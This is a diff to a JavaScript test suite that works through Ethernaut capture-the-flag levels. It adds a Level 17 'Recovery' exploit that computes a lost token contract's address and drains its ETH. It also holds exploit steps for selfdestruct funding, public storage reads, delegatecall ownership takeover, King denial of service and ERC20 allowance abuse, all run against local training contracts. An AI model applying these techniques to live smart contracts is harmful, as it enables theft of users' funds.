@@ -25,8 +25,12 @@ const NaughtCoin           = artifacts.require("NaughtCoin");
 const LibraryContract      = artifacts.require("LibraryContract");
 const Preservation         = artifacts.require("Preservation");
 const PreservationExploit  = artifacts.require("PreservationExploit");
+const Recovery             = artifacts.require("Recovery");
+const RecoveryExploit      = artifacts.require("RecoveryExploit");
+const SimpleToken          = artifacts.require("SimpleToken");
 
-const { expectRevert }     = require('@openzeppelin/test-helpers');
+const { expectRevert }       = require('@openzeppelin/test-helpers');
+const { getContractAddress } = require("@ethersproject/address");
 
 contract("Ethernaut", (accounts) => {
 	const owner   = accounts[0];
@@ -178,7 +182,7 @@ contract("Ethernaut", (accounts) => {
 			await web3.eth.sendTransaction({ from: hacker, to: exploit.address, value: amount, data: null }); // send some balance to the exploit contract using the receive() function
 			await exploit.destroy(contract.address, { from: hacker }); // forcefully send all the balance from the exploit contract to the target contract using selfdestruct() function
 			const balanceNew = await web3.eth.getBalance(contract.address);
-			assert(balanceNew > balanceOld, "Failed to pass level 7."); // make the target's contract balance greater than zero to pass the level
+			assert.equal(balanceNew - balanceOld, amount, "Failed to pass level 7."); // make the target's contract balance greater than zero to pass the level
 		});
 	});
 
@@ -191,8 +195,8 @@ contract("Ethernaut", (accounts) => {
 			const contract = await Vault.new(web3.utils.utf8ToHex("ethernaut8")); // the password is stored in the contract storage which is public
 			const passwordCurrent = web3.utils.hexToAscii(await web3.eth.getStorageAt(contract.address, 1)); // retrieve the password from the contract storage
 			await contract.unlock(web3.utils.utf8ToHex(passwordCurrent));
-			const locked = await contract.locked();
-			assert(!locked, "Failed to pass level 8."); // unlock to pass the level
+			const lockedCurrent = await contract.locked();
+			assert(!lockedCurrent, "Failed to pass level 8."); // unlock to pass the level
 		});
 	});
 
@@ -206,7 +210,7 @@ contract("Ethernaut", (accounts) => {
 		it("Exploit", async () => {
 			const contract = await King.new({ from: owner, value: amount });
 			const exploit = await KingExploit.new();
-			await exploit.run(contract.address, { value: amount + 1 }); // set the new king and DoS the game | omit receive() and fallback() functions in the exploit contract to "crash" the game
+			await exploit.run(contract.address, { value: amount + 1 }); // set the new king and DoS the game | omit receive() and fallback() functions in the exploit contract to crash the game
 			// any new transaction (attempt to become a new king) will now revert because the previous king (exploit contract) does not have the receive() and fallback() functions
 			await expectRevert.unspecified(web3.eth.sendTransaction({ from: hacker, to: contract.address, value: amount + 2, data: null })); // DoS the game to pass the level
 		});
@@ -242,8 +246,8 @@ contract("Ethernaut", (accounts) => {
 			const contract = await Elevator.new();
 			const exploit = await ElevatorExploit.new();
 			await exploit.run(contract.address, 10);
-			const top = await contract.top();
-			assert(top, "Failed to pass level 11."); // get to the top floor to pass the level
+			const topCurrent = await contract.top();
+			assert(topCurrent, "Failed to pass level 11."); // get to the top floor to pass the level
 		});
 	});
 
@@ -261,8 +265,8 @@ contract("Ethernaut", (accounts) => {
 			// contract storage consists of multiple 32-byte slots where smaller values are grouped together to fit into one slot
 			const key = await web3.eth.getStorageAt(contract.address, 5); // retrieve the key from the contract storage
 			await contract.unlock(key.substring(0, 32)); // convert / trim the key to bytes16 value
-			const locked = await contract.locked();
-			assert(!locked, "Failed to pass level 12."); // unlock to pass the level
+			const lockedCurrent = await contract.locked();
+			assert(!lockedCurrent, "Failed to pass level 12."); // unlock to pass the level
 		});
 	});
 
@@ -312,8 +316,8 @@ contract("Ethernaut", (accounts) => {
 		it("Exploit", async () => {
 			const contract = await NaughtCoin.new(owner);
 			const balanceCurrent = await contract.balanceOf(owner);
-			await contract.approve(hacker, balanceCurrent); // call publicly available and unprotected ERC20 functions "approve" and "transferFrom" to exploit the contract
-			await contract.transferFrom(owner, hacker, balanceCurrent, {from: hacker});
+			await contract.approve(hacker, balanceCurrent); // call publicly available and unprotected ERC20 functions approve() and transferFrom() to exploit the contract
+			await contract.transferFrom(owner, hacker, balanceCurrent, { from: hacker });
 			const balanceNew = await contract.balanceOf(owner);
 			assert.equal(balanceNew, 0, "Failed to pass level 15."); // withdraw the whole balance to pass the level
 		});
@@ -332,10 +336,32 @@ contract("Ethernaut", (accounts) => {
 			const library = await LibraryContract.new();
 			const contract = await Preservation.new(library.address, library.address);
 			const exploit = await PreservationExploit.new();
-			await contract.setFirstTime(exploit.address); // "delegatecall" to "LibraryContract" will overwrite "timeZone1Library" address due to incorrectly defined contract storage in "LibraryContract"
-			await contract.setFirstTime((new Date()).getTime(), {from: hacker});
+			await contract.setFirstTime(exploit.address); // delegatecall() to "LibraryContract" will overwrite "timeZone1Library" address due to incorrectly defined contract storage
+			await contract.setFirstTime((new Date()).getTime(), { from: hacker });
 			const ownerCurrent = await contract.owner();
 			assert.equal(hacker, ownerCurrent, "Failed to pass level 16."); // become the owner to pass the level
+		});
+	});
+
+	describe("Level 17 - Recovery", async () => {
+		it("Deploy Recovery and RecoveryExploit Contracts", async () => {
+			let deployed = await Recovery.deployed();
+			assert(deployed, "Recovery contract is not deployed.");
+			deployed = await RecoveryExploit.deployed();
+			assert(deployed, "RecoveryExploit contract is not deployed.");
+		});
+		it("Exploit", async () => {
+			const contract = await Recovery.new();
+			const exploit = await RecoveryExploit.new();
+			await contract.generateToken("ethernaut", 5000, { from: owner }); // create a new token contract and give the owner some of the tokens
+			const targetAddress = getContractAddress({ from: contract.address, nonce: 1 }); // calculate "SimpleToken" address, nonce is the number of transactions sent from the sender's address
+			await web3.eth.sendTransaction({ from: user, to: targetAddress, value: amount, data: null }); // deposit some real ETH in exchange for tokens
+			const balanceHackerOld = await web3.eth.getBalance(hacker);
+			await exploit.run(targetAddress, hacker);
+			const balanceTargetCurrent = await web3.eth.getBalance(targetAddress);
+			const balanceHackerNew = await web3.eth.getBalance(hacker);
+			assert(balanceHackerNew > balanceHackerOld, "1 Failed to pass level 17."); // steal the whole balance to pass the level
+			assert.equal(balanceTargetCurrent, 0, "2 Failed to pass level 17.");
 		});
 	});
 });
